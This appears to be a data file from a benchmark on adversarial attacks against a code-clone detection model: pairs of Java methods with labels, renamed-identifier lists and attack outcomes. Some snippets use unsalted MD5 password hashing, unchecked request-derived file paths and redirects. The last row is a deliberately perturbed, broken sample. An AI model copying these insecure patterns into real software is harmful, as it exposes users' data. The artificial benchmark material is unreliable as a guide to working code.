            audioOptions.put(""pluginSpage"", ""http://www.microsoft.com/Windows/Downloads/Contents/Products/MediaPlayer/"");
        } else if (tipoMime.indexOf(""real"") != -1) {
            audioOptions.put(""id"", ""RVOCX"");
            audioOptions.put(""codeBase"", """");
            audioOptions.put(""classId"", ""clsid:CFCDAA03-8BE4-11cf-B84B-0020AFBBCCFA"");
            audioOptions.put(""mimeType"", ""audio/x-pn-realaudio-plugin"");
            audioOptions.put(""urlSonido"", urlSonido);
            audioOptions.put(""pluginSpage"", """");
        }
        request.setAttribute(""audioOptions"", audioOptions);
        log.debug(""entra success"");
        return mapping.findForward(""success"");
    }
",391,,LABEL_0,LABEL_1,,-4,"genCustRatingFileAndMovieIndexFile,completePath,masterFile,CustRatingFileName,MovieIndexFileName,inFile,inC,outFile1,outC1,outFile2,outC2,fileSize,totalNoDataRows,mappedBuffer,startIndex,count,currentMovie,movieName,customer,rating,outBuf1,outBuf2,endOfIndexFile",,,,0,,0,Greedy,1,0.0006800572077433269,,[]
384,"    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String senha = """";
        String email = request.getParameter(""EmailLogin"");
        try {
            MessageDigest messageDigest = MessageDigest.getInstance(""MD5"");
            messageDigest.update(request.getParameter(""SenhaLogin"").getBytes(), 0, request.getParameter(""SenhaLogin"").length());
            senha = new BigInteger(1, messageDigest.digest()).toString(16);
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        Usuario usuario = UsuarioBll.getUsuarioByEmailAndSenha(email, senha);
        String redirect = request.getHeader(""REFERER"").replace(""?msg=3"", """").replace(""&msg=3"", """") + ""?&msg=3"";
        if (request.getHeader(""REFERER"").indexOf(""?"") != -1) {
            redirect = request.getHeader(""REFERER"").replace(""?msg=3"", """").replace(""&msg=3"", """") + ""&msg=3"";
        }
        if (usuario.getNome() != null) {
            HttpSession session = request.getSession();
            session.setAttribute(""usuario"", usuario);
            redirect = ""index.jsp"";
        }
        response.sendRedirect(redirect);
    }
 <SPLIT>     public static void doVersionCheck(View view) {
        view.showWaitCursor();
        try {
            URL url = new URL(jEdit.getProperty(""version-check.url""));
            InputStream in = url.openStream();
            BufferedReader bin = new BufferedReader(new InputStreamReader(in));
            String line;
            String develBuild = null;
            String stableBuild = null;
            while ((line = bin.readLine()) != null) {
                if (line.startsWith("".build"")) develBuild = line.substring(6).trim(); else if (line.startsWith("".stablebuild"")) stableBuild = line.substring(12).trim();
            }
            bin.close();
            if (develBuild != null && stableBuild != null) {
                doVersionCheck(view, stableBuild, develBuild);
            }
        } catch (IOException e) {
            String[] args = { jEdit.getProperty(""version-check.url""), e.toString() };
            GUIUtilities.error(view, ""read-error"", args);
        }
        view.hideWaitCursor();
    }
",266,,LABEL_0,LABEL_0,LABEL_0,-1,"doPost,request,response,senha,email,messageDigest,usuario,redirect,session",,,,0,,0,GA,3310,1.2070255915323893,failed,[]
385,"    public boolean deleteRoleType(int id, int namespaceId, boolean removeReferencesInRoleTypes, DTSPermission permit) throws SQLException, PermissionException, DTSValidationException {
        checkPermission(permit, String.valueOf(namespaceId));
        boolean exist = isRoleTypeUsed(namespaceId, id);
        if (exist) {
            throw new DTSValidationException(ApelMsgHandler.getInstance().getMsg(""DTS-0034""));
        }
        if (!removeReferencesInRoleTypes) {
            StringBuffer msgBuf = new StringBuffer();
            DTSTransferObject[] objects = fetchRightIdentityReferences(namespaceId, id);
            if (objects.length > 0) {
                msgBuf.append(""Role Type is Right Identity in one or more Role Types."");
            }
            objects = fetchParentReferences(namespaceId, id);
            if (objects.length > 0) {
                if (msgBuf.length() > 0) {
                    msgBuf.append(""\n"");
                }
                msgBuf.append(""Role Type is Parent of one or more Role Types."");
            }
            if (msgBuf.length() > 0) {
                throw new DTSValidationException(msgBuf.toString());
            }
        }
        String sqlRightId = getDAO().getStatement(ROLE_TYPE_TABLE_KEY, ""DELETE_RIGHT_IDENTITY_REF"");
        String sqlParent = getDAO().getStatement(ROLE_TYPE_TABLE_KEY, ""DELETE_PARENT_REF"");
        String sql = getDAO().getStatement(ROLE_TYPE_TABLE_KEY, ""DELETE"");
        PreparedStatement pstmt = null;
        boolean success = false;
        long typeGid = getGID(namespaceId, id);
        conn.setAutoCommit(false);
        int defaultLevel = conn.getTransactionIsolation();
        conn.setTransactionIsolation(Connection.TRANSACTION_READ_COMMITTED);
        try {
            pstmt = conn.prepareStatement(sqlRightId);
            pstmt.setLong(1, typeGid);
            pstmt.executeUpdate();
            pstmt.close();
            pstmt = conn.prepareStatement(sqlParent);
            pstmt.setLong(1, typeGid);
            pstmt.executeUpdate();
            pstmt.close();
            pstmt = conn.prepareStatement(sql);
            pstmt.setLong(1, typeGid);
            int count = pstmt.executeUpdate();
            success = (count == 1);
            conn.commit();
        } catch (SQLException e) {
            conn.rollback();
            throw e;
        } finally {
            conn.setTransactionIsolation(defaultLevel);
            conn.setAutoCommit(true);
            closeStatement(pstmt);
        }
        return success;
    }
 <SPLIT>     public static String fromHtml(URL url, String defaultEncoding, boolean overrideEncoding) throws IOException, BadDocumentException {
        URLConnection conn = url.openConnection();
        String contentType = conn.getContentType();
        String encoding = conn.getContentEncoding();
        if (encoding == null) {
            int i = contentType.indexOf(""charset"");
            if (i >= 0) {
                String s = contentType.substring(i);
                i = s.indexOf('=');
                if (i >= 0) {
                    s = contentType.substring(i + 1).trim();
                    encoding = s.replace(""\'"", """").replace(""\"""", """").trim();
                    if (encoding.equals("""")) {
                        encoding = defaultEncoding;
                    }
                }
            } else {
                encoding = defaultEncoding;
            }
        }
        String expected = ""text/html"";
        if (contentType == null) {
            DefaultXMLNoteErrorHandler.warning(null, 90190, ""Returned content type for url.openConnection() is null"");
            contentType = expected;
        }
        int index = contentType.indexOf(';');
        if (index >= 0) {
            contentType = contentType.substring(0, index).trim();
        }
        if (!contentType.equals(expected)) {
            String msg = translator.translate(""The content type of url '%s' is not '%s', it is '%s'"");
            throw new BadDocumentException(String.format(msg, url.toString(), expected, contentType));
        }
        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream(), encoding));
        return fromHtml(in, encoding);
    }
",427,,LABEL_0,LABEL_0,LABEL_0,-1,"deleteRoleType,id,namespaceId,removeReferencesInRoleTypes,permit,exist,msgBuf,objects,sqlRightId,sqlParent,sql,pstmt,typeGid,defaultLevel,success",,,,0,,0,GA,5594,2.1576890349388123,failed,[]
386,"    private static void readAndRewrite(File inFile, File outFile) throws IOException {
        ImageInputStream iis = ImageIO.createImageInputStream(new BufferedInputStream(new FileInputStream(inFile)));
        DcmParser dcmParser = DcmParserFactory.getInstance().newDcmParser(iis);
        Dataset ds = DcmObjectFactory.getInstance().newDataset();
        dcmParser.setDcmHandler(ds.getDcmHandler());
        dcmParser.parseDcmFile(null, Tags.PixelData);
        PixelDataReader pdReader = pdFact.newReader(ds, iis, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        System.out.println(""reading "" + inFile + ""..."");
        pdReader.readPixelData(false);
        ImageOutputStream out = ImageIO.createImageOutputStream(new BufferedOutputStream(new FileOutputStream(outFile)));
        DcmEncodeParam dcmEncParam = DcmEncodeParam.IVR_LE;
        ds.writeDataset(out, dcmEncParam);
        ds.writeHeader(out, dcmEncParam, Tags.PixelData, dcmParser.getReadVR(), dcmParser.getReadLength());
        System.out.println(""writing "" + outFile + ""..."");
        PixelDataWriter pdWriter = pdFact.newWriter(pdReader.getPixelDataArray(), false, ds, out, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        pdWriter.writePixelData();
        out.flush();
        out.close();
        System.out.println(""done!"");
    }
 <SPLIT>     @Test
    public void returnsEnclosedResponseOnUnsuccessfulException() throws Exception {
        Exception e = new UnsuccessfulResponseException(resp);
        expect(mockBackend.execute(host, req, ctx)).andThrow(e);
        replay(mockBackend);
        HttpResponse result = impl.execute(host, req, ctx);
        verify(mockBackend);
        assertSame(resp, result);
    }
",272,,LABEL_0,LABEL_0,LABEL_0,-1,"readAndRewrite,inFile,outFile,iis,dcmParser,ds,pdReader,out,dcmEncParam,pdWriter",,,,0,,0,GA,3645,1.324005699157715,failed,[]
387,"    private boolean copyFile(File _file1, File _file2) {
        FileInputStream fis;
        FileOutputStream fos;
        try {
            fis = new FileInputStream(_file1);
            fos = new FileOutputStream(_file2);
            FileChannel canalFuente = fis.getChannel();
            canalFuente.transferTo(0, canalFuente.size(), fos.getChannel());
            fis.close();
            fos.close();
            return true;
        } catch (FileNotFoundException e) {
        } catch (IOException e) {
        }
        return false;
    }
 <SPLIT>     @Override
    public void writeData(byte[] data, byte[] options, boolean transferMetaData) throws Throwable {
        long startTime = System.currentTimeMillis();
        long transferredBytesNum = 0;
        long elapsedTime = 0;
        Properties opts = PropertiesUtils.deserializeProperties(options);
        String server = opts.getProperty(TRANSFER_OPTION_SERVER);
        String username = opts.getProperty(TRANSFER_OPTION_USERNAME);
        String password = opts.getProperty(TRANSFER_OPTION_PASSWORD);
        String filePath = opts.getProperty(TRANSFER_OPTION_FILEPATH);
        if (transferMetaData) {
            int idx = filePath.lastIndexOf(PATH_SEPARATOR);
            if (idx != -1) {
                String fileName = filePath.substring(idx + 1) + META_DATA_FILE_SUFIX;
                filePath = filePath.substring(0, idx);
                filePath = filePath + PATH_SEPARATOR + fileName;
            } else {
                filePath += META_DATA_FILE_SUFIX;
            }
        }
        URL url = new URL(PROTOCOL_PREFIX + username + "":"" + password + ""@"" + server + filePath + "";type=i"");
        URLConnection urlc = url.openConnection(BackEnd.getProxy(Proxy.Type.SOCKS));
        urlc.setConnectTimeout(Preferences.getInstance().preferredTimeOut * 1000);
        urlc.setReadTimeout(Preferences.getInstance().preferredTimeOut * 1000);
        OutputStream os = urlc.getOutputStream();
        ByteArrayInputStream bis = new ByteArrayInputStream(data);
        byte[] buffer = new byte[1024];
        int br;
        while ((br = bis.read(buffer)) > 0) {
            os.write(buffer, 0, br);
            if (!transferMetaData) {
                transferredBytesNum += br;
                elapsedTime = System.currentTimeMillis() - startTime;
                fireOnProgressEvent(transferredBytesNum, elapsedTime);
            }
        }
        bis.close();
        os.close();
    }
",98,,LABEL_0,LABEL_0,LABEL_0,-1,"copyFile,_file1,_file2,fis,fos,canalFuente",,,,0,,0,GA,1811,0.6616848866144817,failed,[]
388,"    private static void doGet(LNISoapServlet lni, String itemHandle, String packager, String output, String endpoint) throws java.rmi.RemoteException, ProtocolException, IOException, FileNotFoundException {
        String itemURI = doLookup(lni, itemHandle, null);
        URL url = LNIClientUtils.makeDAVURL(endpoint, itemURI, packager);
        System.err.println(""DEBUG: GET from URL: "" + url.toString());
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod(""GET"");
        conn.setDoInput(true);
        fixBasicAuth(url, conn);
        conn.connect();
        int status = conn.getResponseCode();
        if (status < 200 || status >= 300) {
            die(status, ""HTTP error, status="" + String.valueOf(status) + "", message="" + conn.getResponseMessage());
        }
        InputStream in = conn.getInputStream();
        OutputStream out = new FileOutputStream(output);
        copyStream(in, out);
        in.close();
        out.close();
        System.err.println(""DEBUG: Created local file "" + output);
        System.err.println(""RESULT: Status="" + String.valueOf(conn.getResponseCode()) + "" "" + conn.getResponseMessage());
    }
 <SPLIT>     boolean checkIfUserExists(String username) throws IOException {
        try {
            URL url = new URL(WS_URL + ""/user/"" + URLEncoder.encode(username, ""UTF-8"") + ""/profile.xml"");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.connect();
            InputStream is = conn.getInputStream();
            is.close();
            return true;
        } catch (FileNotFoundException e) {
            return false;
        }
    }
",249,,LABEL_0,LABEL_0,LABEL_0,-1,"doGet,lni,itemHandle,packager,output,endpoint,ProtocolException,IOException,FileNotFoundException,itemURI,url,conn,status,in,out",,,,0,,0,GA,5368,1.942109477519989,failed,[]
389,"    public static void copyFile(File sourceFile, File destFile) throws IOException {
        if (!destFile.exists()) {
            destFile.createNewFile();
        }
        FileChannel source = null;
        FileChannel destination = null;
        try {
            source = new FileInputStream(sourceFile).getChannel();
            destination = new FileOutputStream(destFile).getChannel();
            destination.transferFrom(source, 0, source.size());
        } finally {
            if (source != null) {
                source.close();
            }
            if (destination != null) {
                destination.close();
            }
        }
    }
 <SPLIT>     public static void copyFile(File in, File out) throws Exception {
        FileChannel sourceChannel = new FileInputStream(in).getChannel();
        FileChannel destinationChannel = new FileOutputStream(out).getChannel();
        sourceChannel.transferTo(0, sourceChannel.size(), destinationChannel);
        sourceChannel.close();
        destinationChannel.close();
    }
",116,,LABEL_1,LABEL_1,LABEL_1,-1,"copyFile,sourceFile,destFile,source,destination",,,,0,,0,GA,1878,0.6611140449841817,failed,[]
390,"    public static String connRemote(JSONObject jsonObject, String OPCode) {
        String retSrc = """";
        try {
            HttpClient httpClient = new DefaultHttpClient();
            HttpPost httpPost = new HttpPost(AZConstants.validateURL);
            HttpParams httpParams = new BasicHttpParams();
            List<NameValuePair> nameValuePair = new ArrayList<NameValuePair>();
            nameValuePair.add(new BasicNameValuePair(AZConstants.ACTION_TYPE, OPCode));
            nameValuePair.add(new BasicNameValuePair(AZConstants.PARAM, jsonObject.toString()));
            httpPost.setEntity(new UrlEncodedFormEntity(nameValuePair));
            httpPost.setParams(httpParams);
            HttpResponse response = httpClient.execute(httpPost);
            retSrc = EntityUtils.toString(response.getEntity());
        } catch (Exception e) {
            Log.e(TAG, e.toString());
        }
        return retSrc;
    }
 <SPLIT>     public static Multimap<String, String> getProteins(final Set<String> queries, final int taxon) throws ParserConfigurationException, XPathExpressionException {
        final DocumentBuilder parser = DocumentBuilderFactory.newInstance().newDocumentBuilder();
        final XPathExpression xpe = XPathFactory.newInstance().newXPath().compile(__xpath);
        final Multimap<String, String> proteins = HashMultimap.create();
        for (final String query : queries) {
            HttpURLConnection connection = null;
            try {
                final String encoded = URLEncoder.encode(query.trim(), ""UTF-8"");
                final URL url = new URL(String.format(__urlTempl2, encoded, taxon));
                connection = (HttpURLConnection) url.openConnection();
                connection.setConnectTimeout(__connTimeout);
                connection.setReadTimeout(__readTimeout);
                connection.setRequestProperty(""Connection"", ""close"");
                connection.connect();
                final InputStream stream = connection.getInputStream();
                final Document doc = parser.parse(stream);
                final NodeList nodes = (NodeList) xpe.evaluate(doc, XPathConstants.NODESET);
                if (nodes != null) {
                    final int n = nodes.getLength();
                    for (int i = 0; i < n; i++) {
                        final Node node = nodes.item(i);
                        proteins.put(node.getTextContent().trim(), query.trim());
                    }
                }
            } catch (final Exception ex) {
                continue;
            } finally {
                if (connection != null) connection.disconnect();
            }
        }
        return proteins;
    }
",162,,LABEL_0,LABEL_0,LABEL_0,-1,"connRemote,jsonObject,OPCode,retSrc,httpClient,httpPost,httpParams,nameValuePair,response",,,,0,,0,GA,3325,1.2061669111251831,failed,[]
391,"    public String getSHA256Checksum(String source) {
        String checksum = """";
        try {
            MessageDigest md = MessageDigest.getInstance(""SHA-256"");
            md.update(source.getBytes());
            byte[] byteData = md.digest();
            StringBuffer sb = new StringBuffer();
            for (int i = 0; i < byteData.length; i++) {
                sb.append(Integer.toString((byteData[i] & 0xff) + 0x100, 16).substring(1));
            }
            System.out.println(""Hex format : "" + sb.toString());
            StringBuffer hexString = new StringBuffer();
            for (int i = 0; i < byteData.length; i++) {
                String hex = Integer.toHexString(0xff & byteData[i]);
                if (hex.length() == 1) {
                    hexString.append('0');
                }
                hexString.append(hex);
            }
            checksum = hexString.toString();
        } catch (NoSuchAlgorithmException ex) {
            Logger.getLogger(CMessageDigestFile.class.getName()).log(Level.SEVERE, null, ex);
        }
        return checksum;
    }
 <SPLIT>     public File read() throws IOException {
        URLConnection conn = url.openConnection();
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(5000);
        conn.connect();
        int length = conn.getContentLength();
        String tempDir = System.getProperty(""java.io.tmpdir"");
        if (tempDir == null) {
            tempDir = ""."";
        }
        File tempFile = new File(tempDir + ""/"" + new GUID() + "".dat"");
        tempFile.deleteOnExit();
        InputStream in = null;
        OutputStream out = null;
        ProgressMonitor monitor = new ProgressMonitor(parentComponent, ""Downloading "" + url, null, 0, length);
        try {
            in = conn.getInputStream();
            out = new BufferedOutputStream(new FileOutputStream(tempFile));
            int buflen = 1024 * 30;
            int bytesRead = 0;
            byte[] buf = new byte[buflen];
            ;
            long start = System.currentTimeMillis();
            for (int nRead = in.read(buf); nRead != -1; nRead = in.read(buf)) {
                if (monitor.isCanceled()) {
                    return null;
                }
                bytesRead += nRead;
                out.write(buf, 0, nRead);
                monitor.setProgress(bytesRead);
            }
        } finally {
            if (in != null) {
                in.close();
            }
            if (out != null) {
                out.close();
            }
            monitor.close();
        }
        return tempFile;
    }
",233,,LABEL_0,LABEL_0,LABEL_0,-1,"getSHA256Checksum,source,checksum,md,byteData,sb,i,hexString,hex",,,,0,,0,GA,2926,1.0754073023796082,failed,[]
392,"    public static String getHashedPassword(String password) {
        try {
            MessageDigest digest = MessageDigest.getInstance(""MD5"");
            digest.update(password.getBytes());
            BigInteger hashedInt = new BigInteger(1, digest.digest());
            return String.format(""%1$032X"", hashedInt);
        } catch (NoSuchAlgorithmException nsae) {
            System.err.println(nsae.getMessage());
        }
        return """";
    }
 <SPLIT>     @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
        String path = request.getPathTranslated().substring(0, request.getPathTranslated().length() - request.getPathInfo().length()) + request.getServletPath() + request.getPathInfo();
        File file = new File(path);
        if (file.exists()) {
            FileInputStream in = new FileInputStream(file);
            IOUtils.copyLarge(in, response.getOutputStream());
            in.close();
        }
    }
",88,,LABEL_0,LABEL_0,LABEL_0,-1,"getHashedPassword,password,digest,hashedInt",,,,0,,0,GA,1351,0.4773661454518636,failed,[]
393,"    public static byte[] createPasswordDigest(String password, byte[] salt) throws Exception {
        MessageDigest md = MessageDigest.getInstance(""MD5"");
        md.update(salt);
        md.update(password.getBytes(""UTF8""));
        byte[] digest = md.digest();
        return digest;
    }
 <SPLIT>     public static void copyFile(File in, File out) throws Exception {
        FileChannel sourceChannel = new FileInputStream(in).getChannel();
        FileChannel destinationChannel = new FileOutputStream(out).getChannel();
        sourceChannel.transferTo(0, sourceChannel.size(), destinationChannel);
        sourceChannel.close();
        destinationChannel.close();
    }
",67,,LABEL_0,LABEL_0,LABEL_0,-1,"createPasswordDigest,password,salt,md,digest",,,,0,,0,GA,1595,0.5596325635910034,failed,[]
394,"    public Long split(File targetDirectory, String prefix, long maxUnitBases, long maxUnitEntries) throws Exception {
        if (!targetDirectory.exists()) {
            if (!targetDirectory.mkdirs()) throw new Exception(""Could not create target directory "" + targetDirectory.getAbsolutePath());
        }
        if (!size.isUnknown() && size.getBases() < maxUnitBases && (maxUnitEntries <= 0 || size.getEntries() < maxUnitEntries)) {
            FileInputStream fis = new FileInputStream(this);
            FileChannel fci = fis.getChannel();
            FileOutputStream fos = new FileOutputStream(new File(targetDirectory, prefix + ""_0"" + "".fasta""));
            FileChannel fco = fos.getChannel();
            ByteBuffer buffer = ByteBuffer.allocate(64000);
            while (fci.read(buffer) > 0) {
                buffer.flip();
                fco.write(buffer);
                buffer.clear();
            }
            fci.close();
            fco.close();
            return (long) 1;
        } else {
            long currentBasesCount = 0;
            long currentEntriesCount = 0;
            int targetCount = 0;
            FileChannel fastaChannel = new FileInputStream(this).getChannel();
            int totalSeqCount = 0;
            long totalResiduesCount = 0;
            try {
                long prevTime = System.currentTimeMillis();
                long fastaFileSize = this.length();
                long fastaFileReadOffset = 0L;
                long partitionStartOffset = 0L;
                final int bufferSize = 1024 * 1024;
                ByteBuffer fastaBuffer = ByteBuffer.allocateDirect(bufferSize);
                int fastaReadState = FASTAFileTokenizer.UNKNOWN;
                for (; fastaFileReadOffset < fastaFileSize; ) {
                    long nBytes = fastaChannel.read(fastaBuffer);
                    if (nBytes <= 0) {
                        fastaBuffer.limit(0);
                        break;
                    } else {
                        fastaBuffer.flip();
                        fastaFileReadOffset += nBytes;
                    }
                    for (; ; ) {
                        if (!fastaBuffer.hasRemaining()) {
                            fastaBuffer.clear();
                            break;
                        }
                        int b = fastaBuffer.get();
                        if (b == '\r') {
                        } else if (b == '\n') {
                            if (fastaReadState == FASTAFileTokenizer.DEFLINE) {
                                fastaReadState = FASTAFileTokenizer.SEQUENCELINE;
                            }
                        } else if (b == '>') {
                            if (fastaReadState == FASTAFileTokenizer.UNKNOWN) {
                                fastaReadState = FASTAFileTokenizer.STARTDEFLINE;
                            } else if (fastaReadState == FASTAFileTokenizer.SEQUENCELINE) {
                                fastaReadState = FASTAFileTokenizer.STARTDEFLINE;
                            }
                            if (fastaReadState == FASTAFileTokenizer.STARTDEFLINE) {
                                if (currentBasesCount >= maxUnitBases || maxUnitEntries > 0 && currentEntriesCount >= maxUnitEntries) {
                                    fastaBuffer.position(fastaBuffer.position() - 1);
                                    long currentTime = System.currentTimeMillis();
                                    System.out.println(new java.util.Date() + "" Partition "" + targetCount + "" containing "" + currentEntriesCount + "" sequences and "" + currentBasesCount + "" residues ends at "" + (fastaFileReadOffset - fastaBuffer.remaining()) + "" and was created in "" + (currentTime - prevTime) + "" ms"");
                                    prevTime = currentTime;
                                    long partitionEndOffset = fastaFileReadOffset - fastaBuffer.remaining();
                                    FileChannel partitionChannel = new FileOutputStream(new File(targetDirectory, prefix + ""_"" + targetCount + "".fasta"")).getChannel();
                                    nBytes = fastaChannel.transferTo(partitionStartOffset, partitionEndOffset - partitionStartOffset, partitionChannel);
                                    partitionChannel.force(true);
                                    partitionChannel.close();
                                    targetCount++;
                                    partitionStartOffset += nBytes;
                                    currentBasesCount = 0;
                                    currentEntriesCount = 0;
                                    fastaReadState = FASTAFileTokenizer.UNKNOWN;
                                } else {
                                    fastaReadState = FASTAFileTokenizer.DEFLINE;
                                    currentEntriesCount++;
                                }
                                totalSeqCount++;
                            }
                        } else {
                            if (fastaReadState == FASTAFileTokenizer.SEQUENCELINE) {
                                totalResiduesCount++;
                                currentBasesCount++;
                            }
                        }
                    }
                }
                if (partitionStartOffset < fastaFileSize) {
                    long currentTime = System.currentTimeMillis();
                    System.out.println(new java.util.Date() + "" Partition "" + targetCount + "" containing "" + currentEntriesCount + "" sequences and "" + currentBasesCount + "" residues ends at "" + (fastaFileSize) + "" and was created in "" + (currentTime - prevTime) + "" ms"");
                    FileChannel partitionChannel = new FileOutputStream(new File(targetDirectory, prefix + ""_"" + targetCount + "".fasta"")).getChannel();
                    fastaChannel.transferTo(partitionStartOffset, fastaFileSize - partitionStartOffset, partitionChannel);
                    partitionChannel.force(true);
                    partitionChannel.close();
                    targetCount++;
                }
                if (size.isUnknown()) {
                    size.setBases(totalResiduesCount);
                    size.setEntries(totalSeqCount);
                }
            } finally {
                fastaChannel.close();
            }
            return (long) targetCount;
        }
    }
 <SPLIT>     void copyFile(File src, File dst) throws IOException {
        FileChannel inChannel = new FileInputStream(src).getChannel();
        FileChannel outChannel = new FileOutputStream(dst).getChannel();
        try {
            inChannel.transferTo(0, inChannel.size(), outChannel);
        } finally {
            if (inChannel != null) inChannel.close();
            if (outChannel != null) outChannel.close();
        }
    }
",862,,LABEL_1,LABEL_1,LABEL_1,-1,"split,targetDirectory,prefix,maxUnitBases,maxUnitEntries,fis,fci,fos,fco,buffer,currentBasesCount,currentEntriesCount,targetCount,fastaChannel,totalSeqCount,totalResiduesCount,prevTime,fastaFileSize,fastaFileReadOffset,partitionStartOffset,bufferSize,fastaBuffer,fastaReadState,nBytes",,,,0,,0,GA,8351,3.5311847567558288,failed,[]
395,"    @Test
    public void test() throws Exception {
        InputStream is = this.getClass().getResourceAsStream(""originAndDestination.xml"");
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        IOUtils.copy(is, byteArrayOutputStream);
        TrafficModelDefinition def = MDFReader.read(byteArrayOutputStream.toByteArray());
        TrafficSimulationEngine se = new TrafficSimulationEngine();
        se.init(def);
        int linkId = 2;
        int segmentId = 0;
        Map<Integer, Set<Integer>> linkSegments = new HashMap<Integer, Set<Integer>>();
        Set<Integer> segments = new HashSet<Integer>();
        segments.add(segmentId);
        linkSegments.put(linkId, segments);
        FrameProperties frameProperties = new FrameProperties(linkSegments, new HashSet<Integer>());
        se.setFrameProperties(frameProperties);
        for (float time = 0; time < 60 * 10; time += 0.1f) {
            se.step(0.1f);
            for (RoadObject vehicle : se.getDynamicObjects()) {
                System.out.println(time + "": X="" + vehicle.getPosition() + ""\tV="" + vehicle.getSpeed());
            }
        }
    }
 <SPLIT>     @Override
    public void trainClassifier(File dir, String... args) throws Exception {
        String[] command = new String[args.length + 3];
        command[0] = this.getCommand();
        System.arraycopy(args, 0, command, 1, args.length);
        command[command.length - 2] = new File(dir, ""training-data.libsvm"").getPath();
        command[command.length - 1] = new File(dir, this.getModelName()).getPath();
        Process process = Runtime.getRuntime().exec(command);
        IOUtils.copy(process.getInputStream(), System.out);
        IOUtils.copy(process.getErrorStream(), System.err);
        process.waitFor();
    }
",232,,LABEL_1,LABEL_1,LABEL_1,-1,"test,is,byteArrayOutputStream,def,se,linkId,segmentId,linkSegments,segments,frameProperties,time,vehicle",,,,0,,0,GA,4165,1.5136694192886353,failed,[]
396,"    public boolean crear() {
        int result = 0;
        String sql = ""insert into jugador"" + ""(apellidoPaterno, apellidoMaterno, nombres, fechaNacimiento, pais, rating, sexo)"" + ""values (?, ?, ?, ?, ?, ?, ?)"";
        try {
            connection = conexionBD.getConnection();
            connection.setAutoCommit(false);
            ps = connection.prepareStatement(sql);
            populatePreparedStatement(elJugador);
            result = ps.executeUpdate();
            connection.commit();
        } catch (SQLException ex) {
            ex.printStackTrace();
            try {
                connection.rollback();
            } catch (SQLException exe) {
                exe.printStackTrace();
            }
        } finally {
            conexionBD.close(ps);
            conexionBD.close(connection);
        }
        return (result > 0);
    }
 <SPLIT>     static HashSet<Integer> readZoneIDs(String zoneFileName) {
        HashSet<Integer> zoneids = new HashSet<Integer>();
        try {
            URL url = zoneFileName.getClass().getResource(zoneFileName);
            LineNumberReader lnr = new LineNumberReader(new InputStreamReader(url.openStream()));
            String line = null;
            while ((line = lnr.readLine()) != null) zoneids.add(Integer.parseInt(line));
        } catch (Exception xc) {
            xc.printStackTrace();
        }
        return zoneids;
    }
",133,,LABEL_0,LABEL_0,LABEL_0,-1,"crear,result,sql,connection,ps",,,,0,,0,GA,1903,0.6762652158737182,failed,[]
397,"    public static void main(String[] args) {
        String source, destination;
        if (args[0].toLowerCase().endsWith("".gz"")) {
            source = args[0];
            destination = source.substring(0, source.length() - 3);
        } else {
            source = args[0] + "".gz"";
            destination = args[0];
        }
        InputStream is = null;
        OutputStream os = null;
        try {
            is = new GZIPInputStream(new FileInputStream(source));
            os = new FileOutputStream(destination);
            byte[] buffer = new byte[8192];
            for (int length; (length = is.read(buffer)) != -1; ) os.write(buffer, 0, length);
        } catch (IOException e) {
            System.err.println(""Fehler: Kann nicht entpacken "" + args[0]);
        } finally {
            if (os != null) try {
                os.close();
            } catch (IOException e) {
            }
            if (is != null) try {
                is.close();
            } catch (IOException e) {
            }
        }
    }
 <SPLIT>     private static void main(String[] args) {
        try {
            File f = new File(""test.txt"");
            if (f.exists()) {
                throw new IOException(f + "" already exists.  I don't want to overwrite it."");
            }
            StraightStreamReader in;
            char[] cbuf = new char[0x1000];
            int read;
            int totRead;
            FileOutputStream out = new FileOutputStream(f);
            for (int i = 0x00; i < 0x100; i++) {
                out.write(i);
            }
            out.close();
            in = new StraightStreamReader(new FileInputStream(f));
            for (int i = 0x00; i < 0x100; i++) {
                read = in.read();
                if (read != i) {
                    System.err.println(""Error: "" + i + "" read as "" + read);
                }
            }
            in.close();
            in = new StraightStreamReader(new FileInputStream(f));
            totRead = in.read(cbuf);
            if (totRead != 0x100) {
                System.err.println(""Simple buffered read did not read the full amount: 0x"" + Integer.toHexString(totRead));
            }
            for (int i = 0x00; i < totRead; i++) {
                if (cbuf[i] != i) {
                    System.err.println(""Error: 0x"" + i + "" read as 0x"" + cbuf[i]);
                }
            }
            in.close();
            in = new StraightStreamReader(new FileInputStream(f));
            totRead = 0;
            while (totRead <= 0x100 && (read = in.read(cbuf, totRead, 0x100 - totRead)) > 0) {
                totRead += read;
            }
            if (totRead != 0x100) {
                System.err.println(""Not enough read. Bytes read: "" + Integer.toHexString(totRead));
            }
            for (int i = 0x00; i < totRead; i++) {
                if (cbuf[i] != i) {
                    System.err.println(""Error: 0x"" + i + "" read as 0x"" + cbuf[i]);
                }
            }
            in.close();
            in = new StraightStreamReader(new FileInputStream(f));
            totRead = 0;
            while (totRead <= 0x100 && (read = in.read(cbuf, totRead + 0x123, 0x100 - totRead)) > 0) {
                totRead += read;
            }
            if (totRead != 0x100) {
                System.err.println(""Not enough read. Bytes read: "" + Integer.toHexString(totRead));
            }
            for (int i = 0x00; i < totRead; i++) {
                if (cbuf[i + 0x123] != i) {
                    System.err.println(""Error: 0x"" + i + "" read as 0x"" + cbuf[i + 0x123]);
                }
            }
            in.close();
            in = new StraightStreamReader(new FileInputStream(f));
            totRead = 0;
            while (totRead <= 0x100 && (read = in.read(cbuf, totRead + 0x123, 7)) > 0) {
                totRead += read;
            }
            if (totRead != 0x100) {
                System.err.println(""Not enough read. Bytes read: "" + Integer.toHexString(totRead));
            }
            for (int i = 0x00; i < totRead; i++) {
                if (cbuf[i + 0x123] != i) {
                    System.err.println(""Error: 0x"" + i + "" read as 0x"" + cbuf[i + 0x123]);
                }
            }
            in.close();
            f.delete();
        } catch (IOException x) {
            System.err.println(x.getMessage());
        }
    }
",228,"    public static void main(String[] args) {
        String url, dominated;
        if (args[0].toLowerCase().endsWith("".gz"")) {
            url = args[0];
      dominatednation = url.substring(0, url.index() - 3);
        } else {
            url = args[0] + "".gz"";
            dominated = args[0];
        }
        InputStream is = null;
        OutputStream ow = null;
